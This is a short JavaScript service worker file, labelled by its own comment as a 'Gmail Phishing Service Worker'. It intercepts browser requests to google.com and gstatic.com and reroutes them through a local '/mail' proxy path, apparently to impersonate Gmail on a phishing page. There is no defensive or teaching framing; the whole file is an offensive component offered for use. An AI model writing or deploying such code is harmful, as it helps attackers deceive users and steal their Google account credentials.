// Gmail Phishing Service Worker
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // Proxy all Gmail/Google domains through your worker
  if (url.hostname.includes('google.com') || url.hostname.includes('gstatic.com')) {
    const proxyUrl = `./mail${url.pathname}${url.search}`;
    event.respondWith(fetch(proxyUrl, event.request));
  }
});
